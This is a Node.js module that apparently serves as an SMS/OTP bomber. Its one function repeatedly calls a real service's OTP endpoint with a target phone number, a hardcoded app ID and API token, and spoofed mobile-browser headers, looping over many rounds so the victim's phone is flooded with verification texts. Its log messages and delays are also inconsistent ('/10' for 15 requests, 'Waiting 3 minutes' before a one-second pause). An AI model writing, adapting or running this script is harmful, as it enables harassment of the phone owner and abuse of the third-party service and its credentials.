const axios = require("axios");

async function sheba(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 15; i++) {
      try {
        const response = await axios.post(
  'https://accountkit.sheba.xyz/api/shoot-otp',
  {
    'mobile': `+88${number}`,
    'app_id': '8329815A6D1AE6DD',
    'api_token': 'qDI1cCD5deJEIYkzFl61m0lcl0zJDxEMS9B1HchAFH89LFCRrUXDoNLKAIR2'
  },
  {
    headers: {
      'authority': 'accountkit.sheba.xyz',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/json;charset=UTF-8',
      'custom-headers': '{"portal-name":"Customer Web"}',
      'origin': 'https://www.sheba.xyz',
      'referer': 'https://www.sheba.xyz/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);
        
        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 150000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 3 minutes before next round...`);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { sheba };
